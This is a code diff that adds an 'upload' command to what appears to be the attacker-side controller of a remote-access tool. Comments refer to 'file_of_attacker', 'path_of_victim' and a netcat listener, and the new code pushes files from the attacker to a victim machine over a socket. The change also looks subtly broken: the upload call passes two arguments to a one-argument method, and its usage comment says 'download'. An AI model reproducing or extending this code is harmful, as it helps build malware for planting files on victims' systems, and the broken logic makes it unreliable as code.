@@ -61,6 +61,19 @@ class FileTransfer:
 				file_size -= len(data)
 				f.write(data)
 
+	def upload(self, file):
+		try:
+			file_size = os.stat(file).st_size
+		except FileNotFoundError:
+			self.client_socket.send('0'.encode())
+			return
+		self.client_socket.send((str(file_size) + '\n').encode())
+		with open(file, 'r') as f:
+			while file_size > 0:
+				data = f.readline()
+				file_size -= len(data)
+				self.client_socket.send(data.encode())
+
 # Shell is working client side but only
 # with netcat listener.
 class Shell:
@@ -159,6 +172,11 @@ def main_loop(client_socket):
 			client_socket.send(("download " + cmd.split(" ")[1]).encode())
 			transfer = FileTransfer(client_socket)
 			transfer.download(cmd.split(" ")[1], cmd.split(" ")[2])
+		elif cmd.split(" ")[0] == "upload":
+			# Usage: download <file_of_attacker> <path_of_victim>
+			client_socket.send(("upload " + cmd.split(" ", 2)[2]).encode())
+			transfer = FileTransfer(client_socket)
+			transfer.upload(cmd.split(" ")[1], cmd.split(" ")[2])
 		elif cmd == "exit":
 			return
 
